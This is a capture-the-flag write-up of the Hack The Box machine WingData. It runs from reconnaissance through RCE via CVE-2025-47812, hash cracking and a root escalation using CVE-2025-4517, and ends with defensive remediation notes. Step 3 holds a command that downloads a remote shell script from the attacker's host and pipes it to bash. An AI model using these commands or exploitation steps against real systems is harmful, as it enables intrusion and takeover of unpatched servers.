---
title: WingData
os: Linux
difficulty: Easy
tags:
  - Wing FTP Server
  - CVE-2025-47812
  - unauthenticated RCE
  - credential extraction
  - wacky.xml
  - tarfile Path Traversal
  - CVE-2025-4517
---

# 🛡️ HTB - WingData (Easy)

<p align="center">
  <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
  <img src="https://img.shields.io/badge/OS-Linux-orange?style=for-the-badge&logo=linux" alt="OS Linux" />
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
</p>

---

### 💻 Target Information
- **Machine Name:** WingData
- **Operating System:** Linux
- **Difficulty:** Easy
- **Vulnerabilities:** Unauthenticated RCE in Wing FTP Server (CVE-2025-47812), Credentials leakage in wacky.xml, Sudo Privilege Escalation via Python tarfile Path Traversal (CVE-2025-4517)

---

## Step 1 - Reconnaissance

- 🔍 *Will Use Nmap To See what Ports and Services are Open:*

```bash
nmap -A -sS -P -T4  --min-rate 5000 10.129.11.72
```

```text
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-18 14:28 UTC
Nmap scan report for 10.129.11.72
Host is up (0.46s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
|_http-server-header: Apache/2.4.66 (Debian)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: storage-misc|general purpose|specialized|WAP
Running (JUST GUESSING): HP embedded (91%), Linux 4.X|5.X|2.6.X|2.4.X (89%), Crestron 2-Series (86%)
OS CPE: cpe:/h:hp:p2000_g3 cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:crestron:2_series cpe:/o:linux:linux_kernel:2.4 cpe:/o:linux:linux_kernel:2.6.22
Aggressive OS guesses: HP P2000 G3 NAS device (91%), Linux 4.15 - 5.8 (89%), Linux 5.0 - 5.4 (89%), Linux 5.3 - 5.4 (88%), Linux 5.0 (88%), Linux 2.6.32 (87%), Crestron XPanel control system (86%), Linux 5.0 - 5.5 (86%), Linux 5.4 (86%), OpenWrt 0.9 - 7.09 (Linux 2.4.30 - 2.4.34) (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   375.37 ms 10.10.14.1
2   498.66 ms 10.129.11.72

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.12 seconds
```

- 🔍 *The nmap scan discovers SSH on port 22 and Apache HTTP server on port 80.*
- 🔍 *We map the host `wingdata.htb` inside our `/etc/hosts` file.*

---

## Step 2 - Enumeration

- 🔍 *Browsing to the HTTP service on port 80 redirects us to `http://wingdata.htb/` which hosts a Wing FTP Server administration portal.*
- 🔍 *The Wing FTP Server software version is identified as v7.4.3, which contains critical security vulnerabilities.*

---

## Step 3 - Initial Foothold

- 🔍 *We find that Wing FTP Server versions prior to v7.4.4 are vulnerable to an unauthenticated Remote Code Execution (RCE) vulnerability (CVE-2025-47812).*
- 🔍 *The vulnerability occurs due to improper handling of NULL bytes (`%00`) within the username parameter during administrative authentication. An attacker can inject arbitrary Lua scripts into FTP session files to trigger commands.*
- 🔍 *We execute the exploit using a python RCE script to launch a reverse shell payload:*

```bash
python3 rce.py -u "http://ftp.wingdata.htb/" -c "wget -O- http://10.10.15.133:8000/shell.sh | bash" -U "anonymous"
```

- 🔍 *This grants us initial access as the service user `wingftp`.*
- 🔍 *While enumerating the system, we locate the user database file for the server at `/opt/wftpserver/Data/1/users/wacky.xml`.*
- 🔍 *We read `wacky.xml` and extract the salted MD5 password hash for the user `wacky`.*
- 🔍 *Using John the Ripper or Hashcat, we crack the hash using the known static salt "WingFTP" to recover wacky's plaintext credentials.*
- 🔍 *We log in via SSH as `wacky`:*

```bash
ssh wacky@wingdata.htb
```

---

## Step 4 - Privilege Escalation

- 🔍 *Checking our sudo permissions as user `wacky`:*

```bash
sudo -l
```

```text
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin,
    use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/bin/python3 /opt/backup/restore_backup_clients.py *
```

- 🔍 *The script `/opt/backup/restore_backup_clients.py` executes as root. It accepts an archive file and extracts it using Python's `tarfile.extractall(path=staging_dir, filter="data")` method.*
- 🔍 *We identify a Path Traversal filter bypass vulnerability in Python's `tarfile` module (CVE-2025-4517).*
- 🔍 *The safety filter `"data"` fails when processing deep directory chains where path lengths exceed the system's `PATH_MAX` threshold (4096 bytes). At this size, path resolution stops resolving symlinks correctly, allowing an attacker to write files outside of the target staging directory.*
- 🔍 *We construct a malicious tar archive that exploits this bypass to overwrite `/etc/sudoers` or `/root/.ssh/authorized_keys`:*

```bash
# Generate the exploit payload tar containing the target symlink bypass
python3 exploit_tar.py
```

- 🔍 *We execute the sudo script targeting our custom malicious tar archive:*

```bash
sudo /usr/bin/python3 /opt/backup/restore_backup_clients.py exploit.tar
```

- 🔍 *The exploit successfully overwrites `/root/.ssh/authorized_keys` with our public SSH key.*
- 🔍 *We connect to the machine as root to claim the flag:*

```bash
ssh -i rootkey root@wingdata.htb
```

```bash
cat /root/root.txt
```

---

## Mitigations & Security Perspective

> [!IMPORTANT]
> **🛡️ Blue Team Security Assessment Blueprint**
> Below is the post-exploitation blueprint analyzing every vulnerability and structural misconfiguration exploited in the WingData system. Each vulnerability is mapped to its core risk, threat impact, and practical defensive remediation strategies.

### 🔴 Unauthenticated RCE in Wing FTP Server (CVE-2025-47812)
> [!WARNING]
> **Vulnerability Profile:**
> The Wing FTP Server software version (v7.4.3) was vulnerable to unauthenticated remote code execution via NULL byte injection. The server failed to sanitize NULL characters inside user parameters, letting an attacker execute arbitrary Lua code scripts.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Unauthenticated RCE allows attackers to bypass boundary firewalls and obtain shell environments directly, leading to complete service compromise and local system enumeration.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade Wing FTP Server to the latest secure version (v7.4.4 or above). Restrict public administrative dashboard access to localhost or verified admin IP spaces.
> - **Detection:** Set up detection rules for URL-encoded NULL byte sequences (`%00`) inside username inputs during authentication calls.

### 🔴 Plaintext Configuration Credential Disclosures
> [!WARNING]
> **Vulnerability Profile:**
> The FTP application stored user credentials and salted MD5 hashes within the accessible XML database file `/opt/wftpserver/Data/1/users/wacky.xml`. The service user `wingftp` possessed direct read access, which allowed immediate hash extraction.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Simple configurations storing weak hash standards (like MD5) are highly vulnerable to offline dictionary attacks, facilitating lateral movement across SSH and other system interfaces.

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Restrict access to administrative configuration XML paths. Enforce modern encryption and password-hashing algorithms (such as bcrypt, Argon2) for database user configurations.
> - **Detection:** Monitor read operations on system databases and XML user repositories by non-administrative application users.

### 🔴 Path Traversal Filter Bypass in Python tarfile (CVE-2025-4517)
> [!WARNING]
> **Vulnerability Profile:**
> The administrative backup script `/opt/backup/restore_backup_clients.py` used `tarfile.extractall()` with a `"data"` safety filter to unpack archives. The filter could be bypassed via a PATH_MAX path overflow, letting the attacker write files outside the target workspace.

> [!CAUTION]
> **Risk & Downstream Threat Impact:**
> Path traversal inside elevated backup scripts lets lower-privileged users hijack systems by overwriting system configuration assets (like `/etc/sudoers`, SSH keys, or cron scripts).

> [!TIP]
> **Defensive Remediation & Detection Strategies:**
> - **Remediation:** Upgrade the Python environment to a patched release containing the fix for CVE-2025-4517. Validate and sanitize file paths manually to reject deep symlink structures.
> - **Detection:** Monitor file modification logs for key administrative configuration files (such as `/etc/sudoers` or `/root/.ssh/authorized_keys`) written by child processes of Python.
